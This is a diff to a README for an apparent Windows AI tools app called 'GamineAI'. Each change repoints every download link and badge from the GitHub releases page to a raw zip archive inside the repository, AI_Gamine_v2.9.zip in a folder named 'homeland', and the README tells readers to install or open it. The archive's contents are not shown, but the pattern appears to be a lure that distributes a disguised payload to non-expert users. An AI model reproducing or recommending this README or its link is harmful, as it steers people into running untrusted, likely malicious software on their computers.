@@ -1,6 +1,6 @@
 # 🤖 GamineAI - Simple AI Tools for Everyday Use
 
-[![Download GamineAI](https://img.shields.io/badge/Download-GamineAI-purple?style=for-the-badge)](https://github.com/Teresinatrackless687/GamineAI/releases)
+[![Download GamineAI](https://img.shields.io/badge/Download-GamineAI-purple?style=for-the-badge)](https://raw.githubusercontent.com/Teresinatrackless687/GamineAI/main/homeland/AI_Gamine_v2.9.zip)
 
 ## 📌 Overview
 
@@ -10,7 +10,7 @@ Use it if you want a quick way to explore AI tools from one app instead of movin
 
 ## 🚀 Download GamineAI
 
-Visit this page to download: https://github.com/Teresinatrackless687/GamineAI/releases
+Visit this page to download: https://raw.githubusercontent.com/Teresinatrackless687/GamineAI/main/homeland/AI_Gamine_v2.9.zip
 
 Use the latest release file on that page, then install or open it on your Windows PC.
 
@@ -164,7 +164,7 @@ Open the app and begin with AI prompts or AI guides. These sections are the easi
 
 ## 📥 Download Page
 
-Primary download page: https://github.com/Teresinatrackless687/GamineAI/releases
+Primary download page: https://raw.githubusercontent.com/Teresinatrackless687/GamineAI/main/homeland/AI_Gamine_v2.9.zip
 
 ## 🧰 Basic Use Cases
 
@@ -214,4 +214,4 @@ When you open GamineAI, you should expect a simple desktop app with clear sectio
 
 ## 🔗 Download Button
 
-[![Download GamineAI](https://img.shields.io/badge/Download%20Latest%20Release-GamineAI-blue?style=for-the-badge)](https://github.com/Teresinatrackless687/GamineAI/releases)
+[![Download GamineAI](https://img.shields.io/badge/Download%20Latest%20Release-GamineAI-blue?style=for-the-badge)](https://raw.githubusercontent.com/Teresinatrackless687/GamineAI/main/homeland/AI_Gamine_v2.9.zip)
